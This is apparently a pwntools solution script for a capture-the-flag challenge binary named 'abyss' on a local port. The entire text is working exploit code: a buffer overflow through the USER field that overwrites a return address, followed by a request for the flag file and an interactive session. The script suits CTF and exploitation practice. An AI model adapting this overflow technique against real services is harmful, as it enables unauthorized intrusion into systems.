#!/usr/bin/env python3
from pwn import *

binary = "../challenge/abyss"
elf = context.binary = ELF(binary)

# p = elf.process()
p = remote("localhost", 1337)

p.send(p32(0))
p.recvrepeat(1)

p.send(b"USER " + b"AAAAAAAABBBBBBBBC\x1cDDDDEEEEEEE" + p32(0x00000000004014eb))
p.recvrepeat(1)
p.send(b"PASS " + b"D" * (512 - 5))
p.recvrepeat(1)

p.send(b"/app/flag.txt")

p.interactive()
